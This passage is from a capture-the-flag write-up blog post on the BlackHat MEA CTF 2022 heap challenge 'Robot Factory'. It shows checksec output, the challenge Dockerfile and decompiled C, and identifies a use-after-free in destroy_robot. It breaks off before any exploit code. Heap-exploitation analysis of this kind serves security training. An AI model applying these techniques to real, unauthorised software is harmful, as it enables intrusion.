<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>BlackHat MEA CTF 2022 - Chovid99&#39;s Blog</title><meta name="Description" content="Security&#39;s blog made by Chovid99"><meta property="og:url" content="https://chovid99.github.io/posts/blackhat-mea-ctf-2022/">
  <meta property="og:site_name" content="Chovid99&#39;s Blog">
  <meta property="og:title" content="BlackHat MEA CTF 2022">
  <meta property="og:description" content="Writeup for BlackHat MEA CTF 2022 by Chovid99">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2022-10-02T02:53:04+07:00">
    <meta property="article:modified_time" content="2023-02-24T14:07:40+07:00">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="BlackHat">
    <meta property="article:tag" content="Pwn">
    <meta property="article:tag" content="Heap">
    <meta property="article:tag" content="Unsorted Bin">
    <meta property="article:tag" content="Fastbin">
    <meta property="og:image" content="https://chovid99.github.io/C99-web-card.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png">
  <meta name="twitter:title" content="BlackHat MEA CTF 2022">
  <meta name="twitter:description" content="Writeup for BlackHat MEA CTF 2022 by Chovid99">
      <meta name="twitter:site" content="@Chovid99">
<meta name="application-name" content="Chovid99&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/blackhat-mea-ctf-2022/" /><link rel="prev" href="https://chovid99.github.io/posts/maplectf-2022/" /><link rel="next" href="https://chovid99.github.io/posts/file-structure-attack-part-1/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="9bWYU2tJlhINPHANaxcXkK63aSnxvqj7GHrr_r5tb9s" /><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "BlackHat MEA CTF 2022",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/chovid99.github.io\/posts\/blackhat-mea-ctf-2022\/"
        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, BlackHat, pwn, heap, unsorted bin, fastbin","wordcount":  4313 ,
        "url": "https:\/\/chovid99.github.io\/posts\/blackhat-mea-ctf-2022\/","datePublished": "2022-10-02T02:53:04+07:00","dateModified": "2023-02-24T14:07:40+07:00","publisher": {
            "@type": "Organization",
            "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
                "@type": "Person",
                "name": "Author"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
            <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                
                
            </a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/" title="Check my Home"> Home </a><a class="menu-item" href="/posts/" title="Check my posts"> Posts </a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags"> Tags </a><a class="menu-item" href="/about/" title="Know more about me"> About </a><span class="menu-item delimiter"></span></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
                <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Check my Home">Home</a><a class="menu-item" href="/posts/" title="Check my posts">Posts</a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags">Tags</a><a class="menu-item" href="/about/" title="Know more about me">About</a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">BlackHat MEA CTF 2022</h1><div class="post-meta">
            <div class="post-meta-line">
                </div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Oct 02, 2022">Oct 02, 2022</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;4313 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;21 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#pwn">pwn</a>
      <ul>
        <li><a href="#robot-factory">Robot Factory</a>
          <ul>
            <li><a href="#initial-analysis">Initial Analysis</a></li>
            <li><a href="#exploitation-plan">Exploitation Plan</a></li>
            <li><a href="#detailed-solution">Detailed Solution</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#social-media">Social Media</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p><figure><a class="lightgallery" href="https://i.imgur.com/K113qox.png" title="https://i.imgur.com/K113qox.png" data-thumbnail="https://i.imgur.com/K113qox.png" data-sub-html="<h2>BlackHat MEA CTF 2022</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="https://i.imgur.com/K113qox.png"
            data-srcset="https://i.imgur.com/K113qox.png, https://i.imgur.com/K113qox.png 1.5x, https://i.imgur.com/K113qox.png 2x"
            data-sizes="auto"
            alt="https://i.imgur.com/K113qox.png" />
    </a><figcaption class="image-caption">BlackHat MEA CTF 2022</figcaption>
    </figure>
<figure><a class="lightgallery" href="https://i.imgur.com/K0qujV8.png" title="https://i.imgur.com/K0qujV8.png" data-thumbnail="https://i.imgur.com/K0qujV8.png" data-sub-html="<h2>Quals Final Scoreboard</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="https://i.imgur.com/K0qujV8.png"
            data-srcset="https://i.imgur.com/K0qujV8.png, https://i.imgur.com/K0qujV8.png 1.5x, https://i.imgur.com/K0qujV8.png 2x"
            data-sizes="auto"
            alt="https://i.imgur.com/K0qujV8.png" />
    </a><figcaption class="image-caption">Quals Final Scoreboard</figcaption>
    </figure></p>
<p>During this weekend, I played BlackHat MEA CTF 2022 with my team <code>Fidethus</code>. We managed to secure the 12th position on this CTF. Here are some of my write-ups for challenges that I solved during the CTF.</p>
<h1 id="pwn">pwn</h1>
<h2 id="robot-factory">Robot Factory</h2>
<h3 id="initial-analysis">Initial Analysis</h3>
<p>Let&rsquo;s start by checking the binary via <code>checksec</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    Arch:     amd64-64-little
</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
</span></span><span class="line"><span class="cl">    Stack:    Canary found
</span></span><span class="line"><span class="cl">    NX:       NX enabled
</span></span><span class="line"><span class="cl">    PIE:      No PIE (0x400000)
</span></span></code></pre></td></tr></table>
</div>
</div><p>Okay, so the binary is No PIE and Partial RELRO. This will help a lot! Now, let&rsquo;s check the given Dockerfile</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">FROM ubuntu:18.04
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">RUN apt-get update &amp;&amp; apt-get -y upgrade
</span></span><span class="line"><span class="cl">RUN useradd -d /home/task/ -m -p task -s /bin/bash task
</span></span><span class="line"><span class="cl">RUN echo &#34;task:task&#34; | chpasswd
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">WORKDIR /home/task
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">COPY main .
</span></span><span class="line"><span class="cl">COPY flag.txt .
</span></span><span class="line"><span class="cl">COPY ynetd .
</span></span><span class="line"><span class="cl">COPY run.sh .
</span></span><span class="line"><span class="cl">RUN chown -R root:root /home/task
</span></span><span class="line"><span class="cl">RUN chmod 755 ynetd
</span></span><span class="line"><span class="cl">RUN chmod 755 main
</span></span><span class="line"><span class="cl">RUN chmod 777 flag.txt
</span></span><span class="line"><span class="cl">RUN chmod 755 run.sh
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">USER task
</span></span><span class="line"><span class="cl">CMD [&#34;./run.sh&#34;]
</span></span></code></pre></td></tr></table>
</div>
</div><p>Okay, so the challenge is running in Ubuntu 18.04, and it uses <code>libc-2.27</code> as the glibc version. Now, let&rsquo;s try to analyze the binary by disassembling it.</p>
<p><strong>robots_factory</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">undefined8</span> <span class="nf">robots_factory</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Welcome to the secret robots factory!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">menu</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">iVar1</span> <span class="o">=</span> <span class="nf">read_int</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">destroy_robot</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nf">new_robot</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nf">program_robot</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can see that the binary only gave us 3 menus, new, program, and destroy. Let&rsquo;s check those methods.</p>
<p><strong>new_robot</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">new_robot</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="o">*</span><span class="n">pvVar2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">uint</span> <span class="n">local_20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_15</span> <span class="p">[</span><span class="mi">5</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">number_robots</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Provide robot memory size:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">local_15</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">iVar1</span> <span class="o">=</span> <span class="nf">atoi</span><span class="p">(</span><span class="n">local_15</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">&lt;</span> <span class="mh">0x101</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;you</span><span class="se">\&#39;</span><span class="s">re creating a stupid robot.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">for</span> <span class="p">(</span><span class="n">local_20</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">local_20</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">;</span> <span class="n">local_20</span> <span class="o">=</span> <span class="n">local_20</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">check_robot_slot</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span><span class="n">local_20</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">pvVar2</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,(</span><span class="kt">long</span><span class="p">)</span><span class="n">iVar1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="n">robots</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span><span class="n">local_20</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">pvVar2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="o">*</span><span class="p">(</span><span class="n">undefined4</span> <span class="o">*</span><span class="p">)(</span><span class="n">check_robot_slot</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span><span class="n">local_20</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">robot_memory_size</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span><span class="n">local_20</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="n">iVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;You got new page at index %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">local_20</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="n">number_robots</span> <span class="o">=</span> <span class="n">number_robots</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;All slots are occupied :(&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
</span></span><span class="line"><span class="cl">    <span class="nf">__stack_chk_fail</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can notice some interesting notes from that method:</p>
<ul>
<li>The max size of the total active allocated chunks is only 5</li>
<li>We can only allocate chunks with size larger than 0x101, and based on the <code>atoi</code> method, the size is limited to 4 digits (which means the max value is <code>9999</code>)</li>
<li>Instead of <code>malloc</code>, it uses <code>calloc</code>. We will discuss the key differences later.</li>
<li>The allocated chunk (we call it as <code>robot</code>) address is stored in global variable <code>robots</code></li>
<li>The size of the <code>robot</code> is also stored in a global variable called <code>robot_memory_size</code>.</li>
<li>There is also a global variable called <code>check_robot_slot</code> which will be assigned to <code>1</code> if we create a new <code>robot</code></li>
<li>There&rsquo;s also <code>number_robots</code> global variable, which will count how many <code>robot</code> we&rsquo;ve created.</li>
</ul>
<p>So far, we didn&rsquo;t see any bugs. Let&rsquo;s move to the other methods.</p>
<p><strong>destroy_robot</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">destroy_robot</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_15</span> <span class="p">[</span><span class="mi">5</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Provide robot</span><span class="se">\&#39;</span><span class="s">s slot:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">local_15</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">iVar1</span> <span class="o">=</span> <span class="nf">atoi</span><span class="p">(</span><span class="n">local_15</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((</span><span class="n">iVar1</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="mi">4</span> <span class="o">&lt;</span> <span class="n">iVar1</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Slot is empty!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">check_robot_slot</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">iVar1</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;robot doesn</span><span class="se">\&#39;</span><span class="s">t exist!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="n">robots</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">iVar1</span> <span class="o">*</span> <span class="mi">8</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">undefined4</span> <span class="o">*</span><span class="p">)(</span><span class="n">check_robot_slot</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">iVar1</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">number_robots</span> <span class="o">=</span> <span class="n">number_robots</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
</span></span><span class="line"><span class="cl">    <span class="nf">__stack_chk_fail</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notice that this destroys robot only nullify the <code>check_robot_slot</code> flag, but doesn&rsquo;t null the <code>robots</code> pointer. This might be a bug.</p>
<p><strong>program_robot</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
